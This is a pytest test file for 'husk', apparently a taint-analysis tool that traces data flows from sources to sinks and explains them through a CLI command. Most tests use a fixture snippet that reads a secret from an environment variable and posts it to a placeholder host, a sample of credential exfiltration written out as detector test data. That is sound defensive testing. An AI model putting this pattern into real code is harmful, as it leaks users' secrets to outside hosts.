"""Tests for explainable data-flow traces (husk explain / TaintFinding.trace)."""
import json
import os
import subprocess
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from husk.taint_analysis import analyze_taint_flows  # noqa: E402


def test_finding_carries_source_and_sink_lines():
    code = "import os, requests\ntok = os.getenv('K')\nrequests.post('http://x', data=tok)\n"
    findings = analyze_taint_flows(code)
    assert findings
    f = findings[0]
    assert f.source_line == 2
    assert f.line == 3  # sink


def test_trace_has_three_ordered_steps():
    code = "import os, requests\ntok = os.getenv('K')\nrequests.post('http://x', data=tok)\n"
    f = analyze_taint_flows(code)[0]
    steps = f.trace()
    assert len(steps) == 3
    assert steps[0].startswith("1. SOURCE")
    assert steps[1].startswith("2. FLOW")
    assert steps[2].startswith("3. SINK")
    assert "line 2" in steps[0]
    assert "line 3" in steps[2]


def test_to_dict_is_structured():
    code = "import os, requests\ntok = os.getenv('K')\nrequests.post('http://x', data=tok)\n"
    d = analyze_taint_flows(code)[0].to_dict()
    assert d["source_line"] == 2
    assert d["sink_line"] == 3
    assert d["variable"] == "tok"
    assert isinstance(d["trace"], list) and len(d["trace"]) == 3


def test_str_still_works_and_mentions_origin():
    code = "import os, requests\ntok = os.getenv('K')\nrequests.post('http://x', data=tok)\n"
    s = str(analyze_taint_flows(code)[0])
    assert "taint-tracked data flow" in s
    assert "from line 2" in s


def _run(*args):
    env = dict(os.environ, PYTHONPATH=os.path.join(os.path.dirname(__file__), "..", "src"))
    return subprocess.run(  # noqa: S603
        [sys.executable, "-m", "husk.cli", "explain", *args],
        capture_output=True, text=True, env=env, check=False,
    )


def test_cli_explain_human(tmp_path):
    (tmp_path / "leak.py").write_text(
        "import os, requests\ntok = os.getenv('K')\nrequests.post('http://x', data=tok)\n"
    )
    r = _run(str(tmp_path))
    assert "SOURCE" in r.stdout and "SINK" in r.stdout
    assert r.returncode == 1


def test_cli_explain_json(tmp_path):
    (tmp_path / "leak.py").write_text(
        "import os, requests\ntok = os.getenv('K')\nrequests.post('http://x', data=tok)\n"
    )
    r = _run(str(tmp_path), "--json")
    data = json.loads(r.stdout)
    assert data and data[0]["source_line"] == 2


def test_cli_explain_clean_file(tmp_path):
    (tmp_path / "ok.py").write_text("x = 1 + 1\nprint(x)\n")
    r = _run(str(tmp_path))
    assert r.returncode == 0
    assert "No data-flow" in r.stdout
